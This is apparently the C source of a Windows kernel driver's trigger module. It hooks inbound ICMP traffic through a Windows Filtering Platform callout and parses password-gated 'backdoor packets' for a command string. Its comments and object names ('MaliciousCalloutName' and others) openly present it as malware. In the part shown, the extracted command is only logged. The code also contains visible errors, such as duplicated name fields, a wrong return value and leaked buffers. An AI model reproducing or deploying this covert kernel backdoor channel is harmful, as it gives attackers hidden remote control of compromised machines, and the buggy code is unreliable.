#include "Trigger.h"
#include "Config.h"

NTSTATUS WfpInit(PDRIVER_OBJECT driverObject) {
	engineHandle       = NULL;
	filterDeviceObject = NULL;

	// Create a device object (used in the callout registration)
	NTSTATUS status = IoCreateDevice(driverObject, 0, NULL, FILE_DEVICE_UNKNOWN, 0, FALSE, &filterDeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create the filter device object (0x%X).\n", status));
		return status;
	}

	// Open a session to the filter engine (https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmengineopen0)
	status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to open the filter engine (0x%X).\n", status));
		return status;
	}

	// Register a callout with the filter engine
	status = CalloutRegister();
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to register the filter callout (0x%X).\n", status));
		return status;
	}

	// Add the callout to the system (FWPM_LAYER_INBOUND_TRANSPORT_V4 layer)
	status = CalloutAdd();
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to add the filter callout (0x%X).\n", status));
		return status;
	}

	// Add a sublayer to the system
	status = SublayerAdd();
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to add the sublayer (0x%X).\n", status));
		return status;
	}

	// Add a filter rule to the added sublayer
	status = FilterAdd();
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to add the filter (0x%X).\n", status));
		return status;
	}

	return TRUE;
}

NTSTATUS CalloutRegister() {
	registerCalloutId    = 0;

	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/ns-fwpsk-fwps_callout0_
	FWPS_CALLOUT callout = {
		.calloutKey		 = CALLOUT_GUID,		// Unique GUID that identifies the callout
		.flags			 = 0,					// None
		.classifyFn		 = CalloutFilter,		// Callout function used to process network data (our ICMP packets)
		.notifyFn        = CalloutNotify,		// Callout function used to receive notifications from the filter engine, not needed in our case (but needs to be defined)
		.flowDeleteFn	 = NULL,				// Callout function used to process terminated data, not needed in our case (does't need to be defined)
	};

	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/nf-fwpsk-fwpscalloutregister0
	return FwpsCalloutRegister(filterDeviceObject, &callout, &registerCalloutId);
}

NTSTATUS CalloutAdd() {
	addCalloutId				 = 0;

	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_callout0
	FWPM_CALLOUT callout		 = {
		.flags					 = 0,								 // None
		.displayData.name		 = L"MaliciousCalloutName",
		.displayData.description = L"MaliciousCalloutDescription",
		.calloutKey				 = CALLOUT_GUID,					 // Unique GUID that identifies the callout, should be the same as the registered FWPS_CALLOUT GUID
		.applicableLayer		 = FWPM_LAYER_INBOUND_TRANSPORT_V4,  // https://learn.microsoft.com/en-us/windows/win32/fwp/management-filtering-layer-identifiers-
	};
	
	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmcalloutadd0
	return FwpmCalloutAdd(engineHandle, &callout, NULL, &addCalloutId);
}

VOID CalloutFilter(
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/nc-fwpsk-fwps_callout_classify_fn0
	const FWPS_INCOMING_VALUES* inFixedValues,
	const FWPS_INCOMING_METADATA_VALUES* inMetaValues,
	void* layerData,
	const void* classifyContext,
	const FWPS_FILTER* filter,
	UINT64 flowContext,
	FWPS_CLASSIFY_OUT* classifyOut
) {
	//UNREFERENCED_PARAMETER(inFixedValues);
	//UNREFERENCED_PARAMETER(inMetaValues);
	//UNREFERENCED_PARAMETER(layerData);
	UNREFERENCED_PARAMETER(classifyContext);
	UNREFERENCED_PARAMETER(filter);
	UNREFERENCED_PARAMETER(flowContext);
	UNREFERENCED_PARAMETER(classifyOut);

	/* Only accept packets which:
		*   1) Have a valid layerData pointer
		*   2) Use ICMP
		*   3) Have a valid IP header (size > 0)
	*/
	if (
		!layerData || 
		inFixedValues->incomingValue[FWPS_FIELD_DATAGRAM_DATA_V4_IP_PROTOCOL].value.uint8 != IPPROTO_ICMP ||
		inMetaValues->ipHeaderSize <= 0
		) {

		return;
	}
	KdPrint(("Received an ICMP packet!\n"));

	// Cast layerData to NET_BUFFER_LIST (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/nc-fwpsk-fwps_callout_classify_fn0)
	NET_BUFFER_LIST* fragmentList = (NET_BUFFER_LIST*)layerData;

	/* - https://learn.microsoft.com/en-us/windows-hardware/drivers/network/packet-indication-format states that the NET_BUFFER_LIST structure is a linked list
	*  - Usually, each entry in the list describes a single fragment (https://learn.microsoft.com/en-us/windows-hardware/drivers/network/fragmented-net-buffer-list-structures)
	*    - Our backdoor packets will never be fragmented -> we will only use the first entry
	*  - https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer_list states that the linked list should ONLY be accessed through macros such as 'NET_BUFFER_LIST_FIRST_NB()'
	*/
	
	// Retrieve the first fragment from the fragment list
	NET_BUFFER *firstFragment = NET_BUFFER_LIST_FIRST_NB(fragmentList);

	// Calculate required offsets
	ULONG  icmpLength         = firstFragment->DataLength;  // Size of the ICMP packet
	UINT32 dataLength         = icmpLength - 8;             // ICMP data size    = ICMP packet size - ICMP header size    
	UINT32 payloadLength      = dataLength - 4 - 1;         // ICMP payload size = ICMP packet size - ICMP header size - 4 (password size) - 1 (flag size) 

	//Data needs to have at least 5 bytes (length of the password - 1) and not exceed 1472 bytes (max ICMP data size before fragmentation)
	if (dataLength <= 4 || dataLength >= 1473) {
		KdPrint(("  - [!] Discarding the packet due to invalid data length (%d).\n", dataLength));
		return;
	}
	KdPrint(("  - Data length:      %d.\n", dataLength));

	// Allocate memory for the ICMP packet
	PVOID icmpBuffer = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)icmpLength, ALLOC_TAG_NAME);
	if (!icmpBuffer) {
		return;
	}

	// Read the bytes of the ICMP packet
	PBYTE icmpPacket = (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)icmpLength, icmpBuffer, 1, 0);
	if (!icmpPacket) {
		ExFreePoolWithTag((PVOID)icmpBuffer, ALLOC_TAG_NAME);
		return;
	}

	// Extract the password from the ICMP packet (first 4 bytes after the 8 byte ICMP header)
	BYTE icmpPassword[4] = { 0 };
	RtlCopyMemory(icmpPassword, &icmpPacket[8], 4);

	// Check if the password is valid
	if (!(
		icmpPassword[0] == PASSWORD[0] &&
		icmpPassword[1] == PASSWORD[1] &&
		icmpPassword[2] == PASSWORD[2] &&
		icmpPassword[3] == PASSWORD[3]
		)) {

		KdPrint(("  - [!] Discarding the packet due to an invalid password - {0x%x, 0x%x, 0x%x, 0x%x}.\n", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
		return;
	}
	
	// Extract the flag from the ICMP packet (first byte after the password)
	BYTE icmpFlag = icmpPacket[12];

	// Check if the flag is valid
	if (!(
		icmpFlag == 0 ||
		icmpFlag == 1
		)) {
		KdPrint(("  - [!] Discarding the packet due to an invalid flag - {0x%x}.\n", icmpFlag));
		return;
	}
	

	// Allocate memory for the payload
	LPSTR icmpPayload = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(payloadLength + 1), ALLOC_TAG_NAME); //+1 for '\0'
	if (!icmpPayload) {
		return;
	}

	// Extract the payload from the ICMP packet (bytes after the flag)
	RtlZeroMemory(icmpPayload, payloadLength + 1);
	RtlCopyMemory(icmpPayload, &icmpPacket[13], payloadLength);

	// Null terminate the payload for extra safety
	icmpPayload[payloadLength] = '\0';

	// Note that the KdPrint buffer is limited to 512 bytes (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint)
	KdPrint(("  - Password:         {0x%x, 0x%x, 0x%x, 0x%x}.\n", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
	KdPrint(("  - Payload flag:     {0x%x}.\n", icmpFlag));
	KdPrint(("  - Payload command:  %s.\n", icmpPayload));

	return;
}

NTSTATUS CalloutNotify(
	FWPS_CALLOUT_NOTIFY_TYPE  notifyType,
	const GUID* filterKey,
	FWPS_FILTER* filter
) {
	UNREFERENCED_PARAMETER(notifyType);
	UNREFERENCED_PARAMETER(filterKey);
	UNREFERENCED_PARAMETER(filter);

	// Needs to be defined, but isn't required for anything.
	return STATUS_SUCCESS;
}

NTSTATUS SublayerAdd() {
	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_sublayer0
	FWPM_SUBLAYER sublayer  = {
		.displayData.name	= L"MaliciousSublayerName",
		.displayData.name	= L"MaliciousSublayerDescription",
		.subLayerKey		= SUB_LAYER_GUID,			// Unique GUID that identifies the sublayer
		.weight				= 65535,					// Max UINT16 value, higher weight means higher priority
	};

	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmsublayeradd0
	return FwpmSubLayerAdd(engineHandle, &sublayer, NULL);
}

NTSTATUS FilterAdd() {
	filterId                            = 0;												// Initialize the filterId to 0
	UINT64				  weightValue   = 0xFFFFFFFFFFFFFFFF;								// Max UINT64 value
	FWP_VALUE             weight        = { .type = FWP_UINT64, .uint64 = &weightValue };	// Weight variable, higher weight means higher priority
	FWPM_FILTER_CONDITION conditions[1] = { 0 };											// Filtering conditions can be empty, we want to process every ICMP packet

	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_filter0
	FWPM_FILTER filter		 = {
		.displayData.name	 = L"MaliciousFilterCalloutName",
		.displayData.name	 = L"MaliciousFilterCalloutDescription",
		.layerKey			 = FWPM_LAYER_INBOUND_TRANSPORT_V4,								// Needs to work on the same layer as our added callout
		.subLayerKey		 = SUB_LAYER_GUID,												// Unique GUID that identifies the sublayer, GUID needs to be the same as the GUID of the added sublayer
		.weight      		 = weight,														// Weight variable, higher weight means higher priority
		.numFilterConditions = 0,															// Number of filter conditions (we don't want to do any filtering)
		.filterCondition	 = conditions,													// Empty conditions structure (we don't want to do any filtering)	
		.action.type		 = FWP_ACTION_CALLOUT_INSPECTION,								// We only want to inspect the packet (https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_action0)
		.action.calloutKey	 = CALLOUT_GUID,
	};

	// https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmfilteradd0
	return FwpmFilterAdd(engineHandle, &filter, NULL, &filterId);
}

VOID TermFilterDeviceObject() {
	KdPrint(("Terminating the device object.\n"));

	if (filterDeviceObject) {

		// Remove the filter device object
		IoDeleteDevice(filterDeviceObject);
		filterDeviceObject = NULL;
	}
}

VOID TermCalloutData() {
	KdPrint(("Terminating filters, sublayers and callouts.\n"));

	if (engineHandle) {

		// Remove the added filters and sublayers 
		if (filterId) {
			FwpmFilterDeleteById(engineHandle, filterId);
			FwpmSubLayerDeleteByKey(engineHandle, &SUB_LAYER_GUID);
			filterId = 0;
		}

		// Remove the callout from the FWPM_LAYER_INBOUND_TRANSPORT_V4 layer
		if (addCalloutId) {
			FwpmCalloutDeleteById(engineHandle, addCalloutId);
			addCalloutId = 0;
		}

		// Unregister the callout
		if (registerCalloutId) {
			FwpsCalloutUnregisterById(registerCalloutId);
			registerCalloutId = 0;
		}
	}
}

VOID TermWfpEngine() {
	KdPrint(("Terminating the filter engine handle.\n"));

	if (engineHandle) {

		// Close the filter engine handle
		FwpmEngineClose(engineHandle);
		engineHandle = NULL;
	}
}

VOID WfpCleanup() {
	TermCalloutData();
	TermWfpEngine();
	TermFilterDeviceObject();
}